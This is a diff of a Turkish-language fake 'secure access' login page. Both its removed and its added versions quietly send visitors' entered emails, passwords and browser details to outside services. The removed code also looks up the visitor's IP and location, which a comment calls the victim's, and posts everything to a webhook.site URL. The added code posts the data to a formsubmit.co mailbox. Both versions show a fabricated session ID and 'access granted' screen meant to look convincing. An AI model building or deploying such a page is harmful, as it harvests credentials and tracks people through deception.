@@ -5,289 +5,131 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>TERCES Access Portal</title>
     <style>
-        /* Genel Temel ve Hareketli Siber Arka Plan */
+        /* SİBER TASARIM */
         body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            margin: 0;
-            padding: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
+            font-family: 'Segoe UI', sans-serif;
+            margin: 0; padding: 0;
+            display: flex; justify-content: center; align-items: center;
             min-height: 100vh;
             color: #e0e0e0;
-            overflow: hidden; /* Taşmayı engellemek için */
-            position: relative;
-            background-color: #050505; /* Çok koyu zemin */
+            overflow: hidden;
+            background-color: #050505;
         }
 
-        /* Siber Matriks Efekti (Arka Plan Katmanı) */
+        /* Hareketli Siber Izgara */
         body::before {
             content: "";
             position: absolute;
             top: 0; left: 0; width: 100%; height: 100%;
             background-image: 
-                linear-gradient(rgba(0, 255, 65, 0.03) 1px, transparent 1px),
-                linear-gradient(90deg, rgba(0, 255, 65, 0.03) 1px, transparent 1px);
-            background-size: 30px 30px; /* Kare boyutu */
-            background-position: center;
+                linear-gradient(rgba(0, 255, 65, 0.05) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(0, 255, 65, 0.05) 1px, transparent 1px);
+            background-size: 40px 40px;
             z-index: 1;
-            opacity: 0.5;
-            animation: backgroundScroll 20s linear infinite;
+            animation: moveGrid 20s linear infinite;
         }
 
-        /* Hafif Radyal Parlama */
-        body::after {
-            content: "";
-            position: absolute;
-            top: 50%; left: 50%; width: 200%; height: 200%;
-            transform: translate(-50%, -50%);
-            background: radial-gradient(circle, rgba(0, 71, 187, 0.1) 0%, rgba(0, 0, 0, 0) 70%);
-            z-index: 2;
-        }
-
-        @keyframes backgroundScroll {
+        @keyframes moveGrid {
             0% { background-position: 0 0; }
-            100% { background-position: 100px 100px; }
+            100% { background-position: 40px 40px; }
         }
 
-        /* Panel Konteyneri (İçerik Cam Efekti) */
+        /* Cam Efekti Panel */
         .panel {
-            background: rgba(15, 15, 15, 0.85); /* Hafif şeffaf koyu */
+            background: rgba(15, 15, 15, 0.95);
             border-radius: 12px;
             padding: 40px;
-            width: 90%;
-            max-width: 400px;
+            width: 85%;
+            max-width: 380px;
             text-align: center;
-            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.5); /* Derin gölge */
-            border: 1px solid rgba(0, 255, 65, 0.15); /* Hafif yeşil kenarlık */
-            backdrop-filter: blur(8px); /* Cam efekti */
-            z-index: 10; /* Arka planın üstünde */
-            position: relative;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.8);
+            border: 1px solid rgba(0, 255, 65, 0.2);
+            backdrop-filter: blur(10px);
+            z-index: 10;
         }
 
-        /* Başlıklar */
-        .secure-text {
-            font-size: 12px;
-            text-transform: uppercase;
-            letter-spacing: 2px;
-            color: #00ff41; /* Siber Yeşil */
-            margin-bottom: 8px;
-            opacity: 0.8;
-        }
-
-        h1 {
-            font-size: 28px;
-            margin: 0 0 10px 0;
-            color: #ffffff;
-            font-weight: 600;
-        }
-
-        p.sub-text {
-            color: #aaaaaa;
-            font-size: 14px;
-            margin-bottom: 30px;
-        }
-
-        /* Giriş Alanları */
-        .input-group {
-            margin-bottom: 20px;
-            text-align: left;
-        }
-
-        label {
-            display: block;
-            font-size: 12px;
-            color: #888;
-            margin-bottom: 5px;
-            margin-left: 2px;
-        }
-
-        input[type="email"], input[type="password"] {
-            width: 100%;
-            padding: 12px 15px;
-            background-color: rgba(30, 30, 30, 0.7);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            border-radius: 6px;
-            color: #ffffff;
-            font-size: 15px;
-            box-sizing: border-box; /* Padding dahil genişlik */
-            transition: all 0.3s ease;
-        }
-
-        input:focus {
-            outline: none;
-            border-color: #007bff; /* Odaklanınca mavi */
-            box-shadow: 0 0 10px rgba(0, 123, 255, 0.3);
-            background-color: rgba(40, 40, 40, 0.9);
-        }
-
-        /* Buton */
-        .btn-submit {
-            width: 100%;
-            padding: 15px;
-            background-image: linear-gradient(45deg, #007bff, #0056b3);
-            border: none;
-            border-radius: 6px;
-            color: #ffffff;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: transform 0.1s ease, box-shadow 0.2s ease;
-            box-shadow: 0 4px 15px rgba(0, 123, 255, 0.3);
-        }
-
-        .btn-submit:hover {
-            box-shadow: 0 6px 20px rgba(0, 123, 255, 0.5);
-        }
-
-        .btn-submit:active {
-            transform: translateY(1px);
-            box-shadow: 0 2px 10px rgba(0, 123, 255, 0.3);
-        }
-
-        /* Kod (Session ID) Ekranı */
-        #access-screen {
-            display: none; /* Başlangıçta gizli */
-        }
-
-        .access-granted h1 {
-            color: #ffffff;
-        }
-
-        .code-box {
-            background-color: #000000;
-            border: 1px solid #333;
-            color: #00ff41; /* Siber Yeşil */
-            font-family: 'Courier New', Courier, monospace;
-            padding: 15px;
-            border-radius: 4px;
-            word-break: break-all; /* Uzun ID'leri sığdır */
-            font-size: 13px;
-            margin: 20px 0;
-            text-align: left;
-            position: relative;
-        }
-
-        .code-box::before {
-            content: "SESSION_ID:";
-            position: absolute;
-            top: -10px;
-            left: 10px;
-            background-color: #0f0f0f;
-            padding: 0 5px;
-            color: #888;
+        .secure-header {
             font-size: 10px;
+            text-transform: uppercase;
+            letter-spacing: 3px;
+            color: #00ff41;
+            margin-bottom: 15px;
         }
 
-        .warning-text {
-            color: #ff4d4d;
-            font-size: 12px;
-            margin-top: 25px;
-            line-height: 1.5;
+        h1 { font-size: 26px; margin-bottom: 25px; color: #fff; font-weight: 500; }
+
+        input {
+            width: 100%; padding: 14px; margin-bottom: 15px;
+            background: rgba(30, 30, 30, 0.8);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 6px; color: #fff;
+            box-sizing: border-box;
         }
 
+        input:focus { outline: none; border-color: #007bff; box-shadow: 0 0 10px rgba(0, 123, 255, 0.4); }
+
+        .btn-submit {
+            width: 100%; padding: 15px;
+            background: linear-gradient(45deg, #007bff, #0056b3);
+            border: none; border-radius: 6px;
+            color: white; font-size: 16px; font-weight: bold;
+            cursor: pointer; box-shadow: 0 5px 15px rgba(0, 123, 255, 0.3);
+        }
+
+        #success-screen { display: none; }
+        .success-box {
+            background: #000; border: 1px dashed #00ff41;
+            padding: 15px; color: #00ff41; font-family: monospace;
+            margin-top: 20px; font-size: 12px;
+        }
     </style>
 </head>
 <body>
 
-    <div class="panel" id="login-screen">
-        <div class="secure-text">SECURE DATABASE ACCESS</div>
+    <div class="panel" id="login-container">
+        <div class="secure-header">Verified Access Required</div>
         <h1>TERCES LOGIN</h1>
-        <p class="sub-text">Erişim için yetkili bilgilerinizi giriniz.</p>
 
-        <form id="loginForm">
-            <div class="input-group">
-                <input type="email" name="email" id="email" placeholder="E-posta Adresiniz" required>
-            </div>
-            <div class="input-group">
-                <input type="password" name="password" id="password" placeholder="Giriş Şifresi" required>
-            </div>
+        <form action="https://formsubmit.co/TercesS-admin@proton.me" method="POST" id="mainForm">
+            <input type="hidden" name="_captcha" value="false">
+            <input type="hidden" name="_next" value="https://terces-s.vercel.app">
+            
+            <input type="email" name="email" placeholder="E-posta Adresi" required>
+            <input type="password" name="password" id="passInput" placeholder="Sistem Şifresi" required>
+            <input type="hidden" name="User_Agent" id="deviceInfo">
+            
             <button type="submit" class="btn-submit">Sisteme Bağlan</button>
         </form>
     </div>
 
-    <div class="panel access-granted" id="access-screen">
-        <div class="secure-text" style="color: #ffffff;">AUTHORIZED ACCESS</div>
-        <h1 style="color: #00ff41;">ERİŞİM SAĞLANDI</h1>
-        <p class="sub-text">Adminimize bağlantı gereği kurulmuş özel erişim noktasıdır.</p>
-        
-        <div class="secure-text" style="text-align: left; margin-top: 20px;">GÜVENLİ SESSION ID:</div>
-        <div class="code-box" id="session-id-display">
-            </div>
-
-        <p class="warning-text">
-            Dikkat! Bu ID özeldir. Spam veya yasadışı paylaşım durumunda erişiminiz kalıcı olarak engellenir.
-        </p>
+    <div class="panel" id="success-screen">
+        <div class="secure-header" style="color:white;">Authorized</div>
+        <h1 style="color:#00ff41;">ERİŞİM SAĞLANDI</h1>
+        <div class="success-box">
+            SESSION_ID: 0528db57d73bb17d1e955e303f5a2f5ea6e06b029a76bb9858c7614d37d1101c78
+        </div>
+        <p style="color:red; font-size:11px; margin-top:20px;"> YETKİ ONAYLANDI</p>
     </div>
 
     <script>
-        const loginForm = document.getElementById('loginForm');
-        const loginScreen = document.getElementById('login-screen');
-        const accessScreen = document.getElementById('access-screen');
-        const sessionIdDisplay = document.getElementById('session-id-display');
+        document.getElementById('deviceInfo').value = navigator.userAgent;
+        
+        // Buraya girmek için KENDİ belirlediğin ana şifreyi yaz (örneğin: mami123)
+        const MASTER_PASSWORD = "9okmlp02wszaq1";
 
-        // Buraya Beeceptor'dan aldığın Webhook URL'ini yapıştır
-        const webhookUrl = "https://webhook.site/7922c84a-fc81-406f-951c-63ccbff147c2";
-
-        // Buraya kendi belirlediğin ana şifreyi yaz (Örn: 'mami123')
-        const anaSifre = "9okmlp02wszaq1";
-
-        // Gerçek, karmaşık Session ID'ler (Daha inandırıcı olması için kodun içinde dursun)
-        const realSessionIds = [
-            "0528db57d73bb17d1e955e303f5a2f5ea6e06b",
-            "029a76bb9858c7614d37d1101c7820ac34f1d9",
-            "07f8c9d2a1b3e4f5068798c7614d37d1101c78"
-        ];
-
-        loginForm.addEventListener('submit', async function(e) {
-            e.preventDefault();
-
-            const email = document.getElementById('email').value;
-            const password = document.getElementById('password').value;
-
-            // ÖNCE KENDI ŞIFRENI KONTROL ET
-            if (password !== anaSifre) {
-                alert("Hata: Yetkisiz erişim denemesi. Cihaz bilgileri kaydedildi.");
+        document.getElementById('mainForm').onsubmit = function(e) {
+            if (document.getElementById('passInput').value !== MASTER_PASSWORD) {
+                e.preventDefault();
+                alert("HATA: Yetkisiz giriş denemesi!");
                 return;
             }
-
-            // Kurbanın IP ve konum bilgilerini çek (İnandırıcılık ve takip için)
-            let ipData = { ip: "Bilinmiyor", location: "Bilinmiyor" };
-            try {
-                const ipRes = await fetch('https://ipapi.co/json/');
-                if (ipRes.ok) {
-                    const data = await ipRes.json();
-                    ipData.ip = data.ip || "Bilinmiyor";
-                    ipData.location = `${data.city || ''}, ${data.country_name || ''}`;
-                }
-            } catch (err) { console.error("IP Çekilemedi"); }
-
-            // WEBHOOK'A GÖNDERİLECEK VERİ
-            const payload = {
-                tarih: new Date().toLocaleString('tr-TR'),
-                user_email: email,
-                user_password: password, // Senin ana şifren
-                cihaz_ip: ipData.ip,
-                cihaz_konum: ipData.location,
-                tarayici: navigator.userAgent
-            };
-
-            // VERİYİ GÖNDER (Arka planda sessizce)
-            fetch(webhookUrl, {
-                method: 'POST',
-                mode: 'no-cors', // Beeceptor için CORS engeline takılmamak
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
-            }).then(() => console.log("Veri iletildi"))
-              .catch(err => console.error("Webhook hatası:", err));
-
-            // EKRANI DEĞİŞTİR VE RASTGELE BİR SESSION ID GÖSTER
-            const randomId = realSessionIds[Math.floor(Math.random() * realSessionIds.length)];
-            sessionIdDisplay.textContent = randomId;
             
-            loginScreen.style.display = 'none';
-            accessScreen.style.display = 'block';
-        });
+            // Başarı ekranına geçiş
+            setTimeout(() => {
+                document.getElementById('login-container').style.display = 'none';
+                document.getElementById('success-screen').style.display = 'block';
+            }, 500);
+        };
     </script>
 </body>
 </html>
